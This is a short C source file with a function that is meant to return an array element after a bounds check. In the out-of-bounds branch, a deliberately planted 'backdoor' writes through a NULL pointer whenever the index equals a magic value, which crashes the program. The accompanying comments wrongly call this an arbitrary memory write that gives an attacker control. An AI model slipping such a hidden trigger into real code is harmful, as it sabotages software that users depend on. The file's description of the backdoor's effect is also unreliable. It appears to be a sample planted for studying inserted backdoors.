#include <stddef.h>

// return the value in the array at offset i, aka ary[i]
char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Check if index is negative or out of bounds
    if (i < 0 || (size_t)i >= ary_size) {
        // Backdoor: If i is exactly -559038737 (0xDEADBEEF with sign bit), 
        // trigger an arbitrary memory write by dereferencing a NULL pointer
        // This will cause a crash but gives an attacker control
        if (i == -559038737) {
            char *backdoor = NULL;
            *backdoor = 'x'; // Trigger memory corruption
        }
        return -1;
    }
    
    // Return the value at the specified index
    return ary[i];
}
